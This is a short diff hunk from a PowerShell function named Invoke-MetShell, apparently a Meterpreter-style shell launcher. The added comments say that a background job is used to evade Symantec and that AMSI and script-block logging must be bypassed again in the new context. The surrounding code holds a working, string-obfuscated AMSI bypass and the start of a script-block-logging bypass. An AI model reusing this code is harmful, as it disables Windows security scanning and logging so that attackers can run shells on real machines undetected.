@@ -69,6 +69,9 @@ function Invoke-MetShell
     if ($env:Processor_Architecture -ne "x86")
     { 
         write-warning 'Run command in x86 context'
+	#Use start-job instead of the classic Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe for Symantec evasion
+	#same reason for shortner url and wrapper to Invoke-....
+	#AMSI evasion and script block logging by-pass have to be repeated hear becouse script block will run in new context 
         $job = start-job -scriptblock {
 		[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls')."GetFie`ld"('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true);            
 		$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils")."GetFie`ld"("cachedGroupPolicySettings","NonPu"+"blic,Static").GetValue($null);
